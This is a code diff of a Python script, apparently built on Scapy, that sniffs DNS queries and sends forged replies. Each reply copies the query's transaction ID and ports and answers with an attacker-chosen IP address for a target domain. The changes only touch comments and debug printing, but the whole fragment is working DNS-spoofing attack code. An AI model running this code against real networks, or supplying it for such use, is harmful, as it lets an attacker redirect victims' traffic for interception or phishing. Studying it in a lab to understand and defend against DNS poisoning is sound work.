@@ -55,11 +55,10 @@ def attack(table):
 
 
 def analyze_packet(packet, table):
-    print(packet[DNS])
     # check for proper DNS reqs only
     if not packet.haslayer(DNS) or not packet.haslayer(IP):
         return
-    
+
     # filter out answers
     if packet[DNS].qr != 0:
         return
@@ -73,8 +72,8 @@ def analyze_packet(packet, table):
 
 
 def spoof_packet(packet, spoofed_domain, spoofed_ip):
-    print(f"[SPOOFING]: Packet {packet.summary()}\n")
-    print(f"\t[SPOOFING] Before: \n {packet.show()}")
+    # print(f"[SPOOFING]: Packet {packet.summary()}\n")
+    # print(f"\t[SPOOFING] Before: \n {packet.show()}")
 
     # Make DNS template message
     spoofed_reply = IP() / UDP() / DNS()
@@ -85,15 +84,20 @@ def spoof_packet(packet, spoofed_domain, spoofed_ip):
     spoofed_reply[UDP].sport = packet[UDP].dport
     spoofed_reply[UDP].dport = packet[UDP].sport
 
-    # copy the TX ID
+    # copy the ID
     spoofed_reply[DNS].id = packet[DNS].id
-    spoofed_reply[DNS].qr = 1 # response (0 is request)
+
+    # set query to response
+    spoofed_reply[DNS].qr = 1
     spoofed_reply[DNS].aa = 0
-    spoofed_reply[DNS].qd = packet[DNS].qd # pass the DNS Question Record to the resposne
+    
+    # pass the DNS Question Record to the resposne
+    spoofed_reply[DNS].qd = packet[DNS].qd
+
+    # set spoofed answer
     spoofed_reply[DNS].an = DNSRR(rrname=spoofed_domain+'.', rdata=spoofed_ip, type="A", rclass="IN")
 
-    # print(spoofed_reply.summary())
-    print(f"\t[SPOOFING] AFTER: \n\n  {spoofed_reply.show()}")
+    print("Sending spoofed packet")
 
     send(spoofed_reply)
 
